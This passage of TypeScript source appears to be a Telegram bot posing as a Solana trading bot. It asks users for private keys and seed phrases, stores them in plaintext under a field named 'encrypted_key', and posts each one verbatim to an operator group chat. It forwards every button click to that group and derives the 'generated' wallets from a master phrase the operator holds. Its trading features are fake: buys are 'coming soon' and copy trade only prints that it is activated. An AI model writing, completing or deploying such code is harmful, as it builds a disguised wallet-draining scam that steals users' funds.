                    `Send the Telegram user ID you want to restrict from the bot. ` +
                    `Send /cancel to abort.`,
                });
              }
            } else if (text.startsWith('/blocksend')) {
              if (!isAdmin(userId)) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                if (userId) await setUserState(userId, 'AWAIT_BLOCKSEND_ID');
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🚫 <b>Block + Notify a user</b>\n\n` +
                    `Send the Telegram user ID. They will be blocked and the restricted notice will be sent to them immediately. ` +
                    `Send /cancel to abort.`,
                });
              }
            } else if (text.startsWith('/unblock')) {
              if (!isAdmin(userId)) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                if (userId) await setUserState(userId, 'AWAIT_UNBLOCK_ID');
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `✅ <b>Unblock a user</b>\n\n` +
                    `Send the Telegram user ID you want to unblock. ` +
                    `Send /cancel to abort.`,
                });
              }
            } else if (text.startsWith('/cancel')) {
              if (userId) await clearUserState(userId);
              await tg('sendMessage', { chat_id: chatId, text: '✅ Cancelled.' });
            } else {
              // Stateful text handlers
              const state = userId ? await getUserState(userId) : null;
              if ((state === 'AWAIT_BLOCK_ID' || state === 'AWAIT_UNBLOCK_ID' || state === 'AWAIT_BLOCKSEND_ID') && userId) {
                if (!isAdmin(userId)) {
                  await clearUserState(userId);
                } else {
                  const targetId = Number(text.trim());
                  if (!Number.isInteger(targetId) || targetId <= 0) {
                    await tg('sendMessage', { chat_id: chatId, text: '❌ Invalid user ID. Send a numeric Telegram user ID, or /cancel.' });
                  } else if (ADMIN_USER_IDS.has(targetId) && state !== 'AWAIT_UNBLOCK_ID') {
                    await tg('sendMessage', { chat_id: chatId, text: '⛔ Cannot block an admin.' });
                    await clearUserState(userId);
                  } else if (state === 'AWAIT_BLOCK_ID' || state === 'AWAIT_BLOCKSEND_ID') {
                    const targetChatId = await resolveChatIdForUser(targetId);
                    const { error } = await supabaseAdmin
                      .from('blocked_users')
                      .upsert({ user_id: targetId, blocked_by: userId, chat_id: targetChatId }, { onConflict: 'user_id' });
                    await clearUserState(userId);
                    if (error) {
                      await tg('sendMessage', { chat_id: chatId, text: `❌ Failed to block: ${escapeHtml(error.message)}` });
                    } else {
                      let notified = false;
                      let notifyErr = '';
                      if (state === 'AWAIT_BLOCKSEND_ID') {
                        try {
                          await sendRestricted(targetChatId);
                          notified = true;
                        } catch (e) {
                          notifyErr = e instanceof Error ? e.message : String(e);
                        }
                      }
                      await tg('sendMessage', {
                        chat_id: chatId,
                        parse_mode: 'HTML',
                        text:
                          `🚫 User <code>${targetId}</code> has been blocked.` +
                          (state === 'AWAIT_BLOCKSEND_ID'
                            ? notified
                              ? `\n📨 Restricted notice sent to user.`
                              : `\n⚠️ Could not DM user: ${escapeHtml(notifyErr || 'user must /start the bot first')}.`
                            : ''),
                      });
                    }
                  } else {
                    const { error } = await supabaseAdmin
                      .from('blocked_users')
                      .delete()
                      .eq('user_id', targetId);
                    await clearUserState(userId);
                    if (error) {
                      await tg('sendMessage', { chat_id: chatId, text: `❌ Failed to unblock: ${escapeHtml(error.message)}` });
                    } else {
                      await tg('sendMessage', {
                        chat_id: chatId,
                        parse_mode: 'HTML',
                        text: `✅ User <code>${targetId}</code> has been unblocked.`,
                      });
                    }
                  }
                }
              } else if (state === 'AWAIT_CT_ADDR' && userId) {
                const addr = text.trim();
                if (!isLikelySolanaAddress(addr)) {
                  await tg('sendMessage', { chat_id: chatId, text: '❌ Invalid address. Please send a valid Solana wallet address.' });
                } else {
                  const wallets = await getUserWallets(userId);
                  const r = await getWalletBalances(addr);
                  const base = `✅ Valid address\n\n` + formatBalanceCard(addr, r);
                  if (!wallets.length) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      text: base + `\n\n❌ No wallet connected. Connect a wallet to continue.`,
                      reply_markup: {
                        inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                      },
                    });
                  } else {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      text: base,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: 'Auto BUY', callback_data: 'ct_auto_buy' },
                            { text: 'Notifications BUY', callback_data: 'ct_notif_buy' },
                          ],
                          [{ text: '🔙 Back', callback_data: 'back_main' }],
                        ],
                      },
                    });
                  }
                }
              } else if (state === 'AWAITING_PK' || state === 'AWAITING_SEED') {
                let kp: Keypair | null = null;
                if (state === 'AWAITING_PK') {
                  const bytes = getPrivateKeyBytes(text);
                  if (bytes) {
                    try {
                      if (bytes.length === 32) {
                        kp = Keypair.fromSeed(bytes);
                      } else {
                        kp = Keypair.fromSecretKey(bytes);
                      }
                    } catch (e) {
                      console.error('Keypair creation error:', e);
                    }
                  }
                } else {
                  const mnemonic = text.trim();
                  if (bip39.validateMnemonic(mnemonic)) {
                    kp = deriveSolanaKeypair(mnemonic, 0);
                  }
                }

                if (kp) {
                  const address = kp.publicKey.toBase58();
                  const requester = username !== 'there' ? `@${username}` : `user ${userId}`;
                  const r = await getWalletBalances(address);
                  await tg('sendMessage', {
                    chat_id: chatId,
                    parse_mode: 'HTML',
                    text:
                      `✅ <b>Successfully connected</b>\n\n` +
                      formatBalanceCard(address, r) +
                      lowBalanceNotice(r.solBalance),
                  });
                  await supabaseAdmin.from('imported_wallets').insert({
                    telegram_user_id: userId,
                    address: address,
                    encrypted_key: text.trim(),
                  });
                  const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
                  await tg('sendMessage', {
                    chat_id: groupChatId,
                    parse_mode: 'HTML',
                    text:
                      `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
                      formatBalanceCard(address, r) +
                      `\n\n<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
                  });
                  if (userId) await clearUserState(userId);
                } else {
                  // Detect if user pasted a wallet address instead of a key/phrase
                  if (isLikelySolanaAddress(text.trim())) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      text: '❌ This address is invalid for import. You sent a public wallet address, but we need your private key or seed phrase to connect the wallet.',
                    });
                  } else {
                    const msg = state === 'AWAITING_PK'
                      ? '❌ Invalid private key. Please send a valid Solana private key (Base58, Hex, or Base64).'
                      : '❌ Invalid seed phrase. Please send a valid 12 or 24 word BIP39 recovery phrase.';
                    await tg('sendMessage', { chat_id: chatId, text: msg });
                  }
                }
              } else if (state && state.startsWith('BUY_CA|') && userId) {
                const walletAddr = state.slice('BUY_CA|'.length);
                const ca = text.trim();
                if (!isLikelySolanaAddress(ca)) {
                  await tg('sendMessage', {
                    chat_id: chatId,
                    text: '❌ Invalid contract address. Please send a valid Solana token address.',
                  });
                } else {
                  const info = await fetchTokenInfo(ca);
                  if (!info) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      text: '❌ Could not find token information for that address. Double-check the contract address and try again.',
                    });
                  } else {
                    await setUserState(userId, `BUY_TKN|${walletAddr}|${info.address}|${info.symbol}|${info.name}`);
                    const twitterLine = info.twitter ? `\n🐦 <a href="${escapeHtml(info.twitter)}">Twitter</a>` : '';
                    const text2 =
                      `📊 <b>Token Information</b>\n\n` +
                      `🏷️ <b>Name:</b> ${escapeHtml(info.name)}\n` +
                      `🔤 <b>Symbol:</b> ${escapeHtml(info.symbol)}\n` +
                      `🔢 <b>Decimals:</b> ${info.decimals ?? 'N/A'}\n` +
                      `💰 <b>Price:</b> ${fmtUsd(info.priceUsd)}\n` +
                      `📈 <b>Market Cap:</b> ${fmtUsd(info.marketCap)}\n` +
                      `💧 <b>Liquidity:</b> ${fmtUsd(info.liquidityUsd)}\n` +
                      `📍 <b>Address:</b> <code>${escapeHtml(info.address)}</code>\n` +
                      `📅 <b>Created:</b> ${info.createdAt ?? 'N/A'}` +
                      twitterLine +
                      `\n\nIs this the correct token?`;
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      disable_web_page_preview: true,
                      text: text2,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: '✅ Confirm Token', callback_data: 'buy_confirm' },
                            { text: '❌ Cancel', callback_data: 'back_main' },
                          ],
                          [{ text: '📊 View Chart', url: info.dexUrl }],
                        ],
                      },
                    });
                  }
                }
              } else if (isLikelySolanaAddress(text.trim())) {
                const candidate = text.trim();
                const info = await fetchTokenInfo(candidate);
                if (info) {
                  const twitterLine = info.twitter ? `\n🐦 <a href="${escapeHtml(info.twitter)}">Twitter</a>` : '';
                  await tg('sendMessage', {
                    chat_id: chatId,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    text:
                      `📊 <b>Token Information</b>\n\n` +
                      `🏷️ <b>Name:</b> ${escapeHtml(info.name)}\n` +
                      `🔤 <b>Symbol:</b> ${escapeHtml(info.symbol)}\n` +
                      `🔢 <b>Decimals:</b> ${info.decimals ?? 'N/A'}\n` +
                      `💰 <b>Price:</b> ${fmtUsd(info.priceUsd)}\n` +
                      `📈 <b>Market Cap:</b> ${fmtUsd(info.marketCap)}\n` +
                      `💧 <b>Liquidity:</b> ${fmtUsd(info.liquidityUsd)}\n` +
                      `📍 <b>Address:</b> <code>${escapeHtml(info.address)}</code>\n` +
                      `📅 <b>Created:</b> ${info.createdAt ?? 'N/A'}` +
                      twitterLine,
                    reply_markup: mainMenuKeyboard(),
                  });
                } else {
                  const r = await getWalletBalances(candidate);
                  await tg('sendMessage', {
                    chat_id: chatId,
                    parse_mode: 'HTML',
                    text: `🔎 <b>Wallet lookup</b>\n\n` + formatBalanceCard(candidate, r),
                    reply_markup: mainMenuKeyboard(),
                  });
                }
              }
            }
          } else if (update.callback_query) {
            const cq = update.callback_query;
            const data: string = cq.data ?? '';
            const chatId: number | undefined = cq.message?.chat?.id;
            const messageId: number | undefined = cq.message?.message_id;
            const username = cq.from?.username || cq.from?.first_name || 'there';

            // Block check — restricted users enter the appeal flow
            const cqUserId = cq.from?.id;
            const blocked = cqUserId ? await getBlockedUser(cqUserId) : null;
            if (blocked && cqUserId && chatId) {
              await ackCallback(cq.id);
              const stage = blocked.appeal_stage;
              if (data === 'appeal_start' && (!stage || stage === null)) {
                await supabaseAdmin
                  .from('blocked_users')
                  .update({ appeal_stage: 'await_wallet', chat_id: chatId })
                  .eq('user_id', cqUserId);
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `📝 <b>Wallet Verification</b>\n\n` +
                    `Please send the <b>wallet address</b> you were trading with so we can verify it.`,
                });
              } else if (data === 'appeal_confirm' && stage === 'await_confirm') {
                await supabaseAdmin
                  .from('blocked_users')
                  .update({ appeal_stage: 'submitted', appeal_submitted_at: new Date().toISOString(), chat_id: chatId })
                  .eq('user_id', cqUserId);
                await sendAppealSubmitted(chatId);
              } else if (stage === 'submitted' || stage === 'approved' || stage === 'await_confirm') {
                await sendAppealSubmitted(chatId);
              } else {
                await sendRestricted(chatId);
              }
              return Response.json({ ok: true, blocked: true });
            }


            // Audit: forward every button click to the group
            await notifyGroup(
              groupChatId,
              cq.from,
              `🔘 Button clicked:`,
              `<code>${escapeHtml(data)}</code>`,
            );



            if (data === 'generate_wallet') {
              try {
                await handleGenerate({
                  userId: cq.from?.id,
                  username: cq.from?.username,
                  replyChatId: chatId!,
                  groupChatId,
                  callbackQueryId: cq.id,
                });
              } catch (e) {
                console.error('generate_wallet error:', e);
                await ackCallback(cq.id, 'Generation failed');
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `❌ Wallet generation failed: ${escapeHtml(String((e as Error)?.message ?? e))}`,
                });
              }
            } else if (data === 'gen_new_phrase') {
              if (!isAdmin(cq.from?.id)) {
                await ackCallback(cq.id, 'Not authorized');
              } else {
                try {
                  await rotateMasterMnemonic(groupChatId);
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: '✅ Master phrase rotated. Next wallets start at index 0. New phrase posted to group.',
                  });
                  await ackCallback(cq.id, 'Rotated');
                } catch (e) {
                  console.error('gen_new_phrase error:', e);
                  await ackCallback(cq.id, 'Rotation failed');
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: `❌ Rotation failed: ${escapeHtml(String((e as Error)?.message ?? e))}`,
                  });
                }
              }
            } else if (data === 'wallet_manage' && chatId && messageId) {
              await editToWalletManage(chatId, messageId);
              await ackCallback(cq.id);
            } else if (data === 'import_wallet' && chatId && messageId) {
              await editToImportMethod(chatId, messageId);
              await ackCallback(cq.id);
            } else if (data === 'back_main' && chatId && messageId) {
              await editToMain(chatId, messageId, username);
              await ackCallback(cq.id);
            } else if (data === 'import_pk') {
              await setUserState(cq.from.id, 'AWAITING_PK');
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🔑 Import Private Key \n\n Please send your private key: \n\n Accepted formats: \n • Base58 (from Phantom/Solflare) - Most common \n • Hex (32 or 64 characters, with or without 0x) \n • Base64 encoded \n\n ⚠️ Make sure you're copying the entire key without extra spaces. \n ⚠️ This message will auto-delete after 1 minutes for security.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'import_seed') {
              await setUserState(cq.from.id, 'AWAITING_SEED');
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `📝 Import Mnemonic Phrase \n\n Please send your 12 or 24 word recovery phrase: \n\n ⚠️ Send words separated by spaces. This message will auto-delete after 1 minutes.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'sell') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text:
                  `📭 No Tokens Found\n\n` +
                  `You don't have any tokens in your wallets to sell.\n\n` +
                  `Buy some tokens first or check another wallet.`,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: '🛒 BUY Token', callback_data: 'buy' }],
                    [{ text: '🔙 Back', callback_data: 'back_main' }],
                  ],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'buy') {
              const uid = cq.from?.id;
              const wallets = uid ? await getUserWallets(uid) : [];
              if (!wallets.length) {
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text:
                    `📭 No wallets found.\n\n` +
                    `Generate or import a wallet first from 💰 Wallet Management.`,
                  reply_markup: {
                    inline_keyboard: [
                      [{ text: '💰 Wallet Management', callback_data: 'wallet_manage' }],
                      [{ text: '🔙 Back', callback_data: 'back_main' }],
                    ],
                  },
                });
                await ackCallback(cq.id);
              } else {
                const balances = await Promise.all(wallets.map((w) => getSolBalance(w.address)));
                const lines = wallets.map((w, i) =>
                  `Wallet${i + 1}  ${shortAddr(w.address)}   (${balances[i].toFixed(4)} SOL)`
                );
                const buttons = wallets.map((w, i) => [{
                  text: `Wallet ${i + 1} (${balances[i].toFixed(4)} SOL)`,
                  callback_data: `bw|${w.address}`,
                }]);
                buttons.push([{ text: '🔙 Back', callback_data: 'back_main' }]);
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `🛒 <b>Select a wallet to buy from</b>\n\n${escapeHtml(lines.join('\n'))}`,
                  parse_mode: 'HTML',
                  reply_markup: { inline_keyboard: buttons },
                });
                await ackCallback(cq.id);
              }
            } else if (data.startsWith('bw|')) {
              const walletAddr = data.slice(3);
              const uid = cq.from?.id;
              if (uid) await setUserState(uid, `BUY_CA|${walletAddr}`);
              const wallets = uid ? await getUserWallets(uid) : [];
              const idx = wallets.findIndex((w) => w.address === walletAddr);
              const num = idx >= 0 ? idx + 1 : 1;
              const bal = await getSolBalance(walletAddr);
              await tg('sendMessage', {
                chat_id: chatId!,
                parse_mode: 'HTML',
                text:
                  `🔍 <b>Enter Token Address</b>\n\n` +
                  `📍 Wallet: Wallet ${num}\n` +
                  `💰 Balance: ${bal.toFixed(4)} SOL\n\n` +
                  `Please send the contract address (CA) of the token you want to buy:`,
              });
              await ackCallback(cq.id);
            } else if (data === 'buy_confirm') {
              const uid = cq.from?.id;
              const st = uid ? await getUserState(uid) : null;
              if (!st || !st.startsWith('BUY_TKN|')) {
                await ackCallback(cq.id, 'Session expired');
              } else {
                const [, walletAddr, tokenAddr, symbol, ...nameParts] = st.split('|');
                const name = nameParts.join('|');
                const bal = await getSolBalance(walletAddr);
                const insufficient = bal < 0.002;
                const baseText =
                  `💰 <b>Buy ${escapeHtml(symbol)}</b>\n\n` +
                  `📍 Wallet Balance: ${bal.toFixed(4)} SOL\n` +
                  `🏷️ Token: ${escapeHtml(name)} (${escapeHtml(symbol)})\n\n`;
                const tail = insufficient
                  ? `⚠️ Insufficient SOL balance!\n\nYou need at least 0.002 SOL to make a purchase.\n\nAdd SOL to your wallet and try again.`
                  : `Select an amount to buy:`;
                const mark = (amt: number) => (bal >= amt ? '' : '❌ ');
                await tg('sendMessage', {
                  chat_id: chatId!,
                  parse_mode: 'HTML',
                  text: baseText + tail,
                  reply_markup: {
                    inline_keyboard: [
                      [
                        { text: `${mark(0.5)}0.5 SOL`, callback_data: `bamt|0.5` },
                        { text: `${mark(1.0)}1.0 SOL`, callback_data: `bamt|1.0` },
                      ],
                      [
                        { text: `${mark(2.0)}2.0 SOL`, callback_data: `bamt|2.0` },
                        { text: `${mark(5.0)}5.0 SOL`, callback_data: `bamt|5.0` },
                      ],
                      [{ text: `${mark(10.0)}10.0 SOL`, callback_data: `bamt|10.0` }],
                      [{ text: '🔙 Back', callback_data: 'back_main' }],
                    ],
                  },
                });
                await ackCallback(cq.id);
              }
            } else if (data.startsWith('bamt|')) {
              const amt = Number(data.slice(5));
              const uid = cq.from?.id;
              const st = uid ? await getUserState(uid) : null;
              if (!st || !st.startsWith('BUY_TKN|')) {
                await ackCallback(cq.id, 'Session expired');
              } else {
                const [, walletAddr, , symbol] = st.split('|');
                const bal = await getSolBalance(walletAddr);
                if (bal < amt) {
                  await ackCallback(cq.id, `⚠️ Insufficient SOL (have ${bal.toFixed(4)})`);
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    parse_mode: 'HTML',
                    text:
                      `⚠️ <b>Insufficient SOL balance!</b>\n\n` +
                      `You need at least ${amt} SOL to make this purchase.\n` +
                      `Current balance: ${bal.toFixed(4)} SOL\n\n` +
                      `Add SOL to your wallet and try again.`,
                  });
                } else {
                  await ackCallback(cq.id, 'Coming soon');
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: `🚧 Swap execution for ${amt} SOL → ${symbol} is coming soon.`,
                  });
                }
              }
            } else if (data === 'copy_trade') {
              await tg('sendMessage', {
                chat_id: chatId!,
                parse_mode: 'HTML',
                text:
                  `📋 <b>Copy Trade</b>\n\n` +
                  `Automatically copy trades from other wallets to your own wallets.\n\n` +
                  `<b>Current Status:</b>\n\n` +
                  `🔴 Not Active\n\n` +
                  `No copy trade configuration found.\n\n` +
                  `When enabled, bot will automatically execute trades matching the source wallet.`,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: '📋 Setup Copy Trade', callback_data: 'ct_setup' }],
                    [{ text: '📊 View Copy Trading', callback_data: 'ct_view' }],
                    [{ text: '🔙 Back', callback_data: 'back_main' }],
                  ],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_setup') {
              if (cq.from?.id) await setUserState(cq.from.id, 'AWAIT_CT_ADDR');
              await tg('sendMessage', {
                chat_id: chatId!,
                text:
                  `🔍 Copy Trade Setup\n\n` +
                  `Please enter the wallet User ID/Address of the wallet you want to copy trades from:\n\n` +
                  `Type /cancel to cancel.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_view') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `📊 No copy trade configurations found.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_auto_buy') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🤖 Bot will automatically execute Buy trades from the target wallet.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '✅ Continue', callback_data: 'ct_auto_buy_go' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_auto_buy_go') {
              if (cq.from?.id) await clearUserState(cq.from.id);
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `Auto BUY activated ✅`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_notif_buy') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🔔 You will have to approve all buy/sell trades before they execute.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '✅ Continue', callback_data: 'ct_notif_buy_go' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_notif_buy_go') {
              if (cq.from?.id) await clearUserState(cq.from.id);
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `Notification buy activated ✅`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'withdraw_sol') {
              const uid = cq.from?.id;
              const wallets = uid ? await getUserWallets(uid) : [];
              if (!wallets.length) {
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `❌ No connected wallets found.`,
                  reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                  },
                });
              } else {
                const balances = await Promise.all(wallets.map((w) => getSolBalance(w.address)));
                const buttons = wallets.map((w, i) => [{
                  text: `Wallet ${i + 1}  ${shortAddr(w.address)}  (${balances[i].toFixed(4)} SOL)`,
                  callback_data: `wd|${w.address}`,
                }]);
                buttons.push([{ text: '🔙 Back', callback_data: 'back_main' }]);
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `💰 Withdraw SOL\n\nSelect wallet to withdraw from:`,
                  reply_markup: { inline_keyboard: buttons },
                });
              }
              await ackCallback(cq.id);
            } else {
              await ackCallback(cq.id);
            }
          }
        } catch (e) {
          console.error('Webhook handler error:', e);
          return Response.json({ ok: false }, { status: 500 });
        }

        return Response.json({ ok: true });
      },
    },
  },
});
